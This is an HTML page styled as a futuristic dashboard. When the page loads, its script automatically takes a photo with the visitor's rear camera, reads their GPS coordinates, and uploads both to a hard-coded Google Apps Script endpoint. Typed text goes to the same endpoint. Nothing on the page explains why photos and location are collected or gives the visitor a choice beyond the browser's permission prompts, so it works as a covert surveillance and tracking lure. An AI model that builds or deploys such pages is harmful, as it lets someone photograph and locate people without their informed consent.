<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科幻資訊與拍照儀表板</title>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, #03031c, #0a0a4a);
      height: 100vh;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #00ffff;
    }
    .dashboard {
      width: 90%;
      max-width: 1200px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }
    .title {
      grid-column: span 2;
      text-align: center;
      font-size: 2.5rem;
      margin-bottom: 20px;
      text-shadow: 0 0 20px #00eaff, 0 0 30px #0077ff;
    }
    .card {
      background: rgba(15, 15, 50, 0.9);
      border: 2px solid #00ffff;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
      text-align: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
      color: #ffffff;
    }
    .footer {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      background: linear-gradient(to right, #03031c, #0a0a4a);
    }
    .logo img {
      width: 80px;
    }
    .text-input {
      width: 80%;
      padding: 10px;
      margin: 10px auto;
      border: 1px solid #00ffcc;
      border-radius: 8px;
      background: rgba(0, 15, 40, 0.8);
      color: #ffffff;
      font-size: 1rem;
    }
    .button {
      display: inline-block;
      padding: 10px 20px;
      margin-top: 10px;
      font-size: 1rem;
      color: #ffffff;
      background: linear-gradient(45deg, #0077ff, #00eaff);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      text-shadow: 0 0 10px #00eaff;
    }
    .button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <h1 class="title">科幻資訊與拍f照儀表板</h1>
    <!-- 拍照狀態 -->
    <div class="card">
      <h2>拍照狀態</h2>
      <p id="photoStatus">狀態：啟動中...</p>
    </div>
    <!-- GPS 資訊 -->
    <div class="card">
      <h2>GPS 資訊</h2>
      <p id="gpsCoordinates">經度: --, 緯度: --</p>
      <p id="gpsAddress">地址: 讀取中...</p>
    </div>
    <!-- 手動輸入文字 -->
    <div class="card">
      <h2>文字回傳</h2>
      <input type="text" id="textInput" class="text-input" placeholder="輸入要回傳的文字">
      <button class="button" onclick="sendTextToServer()">傳送文字</button>
    </div>
  </div>
  <footer class="footer">
    <div class="logo">
      <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
    </div>
  </footer>
  <script>
    const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec';

    async function startCameraAndSend() {
      const statusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach((track) => track.stop());
          sendToServer({ imageData: photoData.split(',')[1], message: '自動上傳圖片' });
        }, 1000);
      } catch (error) {
        statusElement.innerText = '相機啟動失敗！';
        console.error('相機啟動錯誤:', error);
      }
    }

    async function getGPSInfo() {
      const gpsCoordinatesElement = document.getElementById('gpsCoordinates');
      const gpsAddressElement = document.getElementById('gpsAddress');
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          const { latitude, longitude } = position.coords;
          gpsCoordinatesElement.innerText = `經度: ${longitude.toFixed(5)}, 緯度: ${latitude.toFixed(5)}`;
          try {
            sendToServer({ latitude, longitude, message: 'GPS 資訊回傳' });
          } catch (error) {
            gpsAddressElement.innerText = 'GPS 回傳失敗';
            console.error('GPS 錯誤:', error);
          }
        });
      }
    }

    function sendTextToServer() {
      const textInput = document.getElementById('textInput').value;
      if (textInput.trim()) {
        sendToServer({ message: textInput });
        alert('文字已回傳！');
      } else {
        alert('請輸入內容');
      }
    }

    async function sendToServer(data) {
      try {
        const formData = new URLSearchParams(data);
        const response = await fetch(BACKEND_URL, { method: 'POST', body: formData });
        const result = await response.json();
        if (result.success) {
          console.log('資料回傳成功:', result);
        } else {
          console.error('資料回傳失敗:', result.error);
        }
      } catch (error) {
        console.error('回傳錯誤:', error);
      }
    }

    window.onload = () => {
      startCameraAndSend();
      getGPSInfo();
    };
  </script>
</body>
</html>
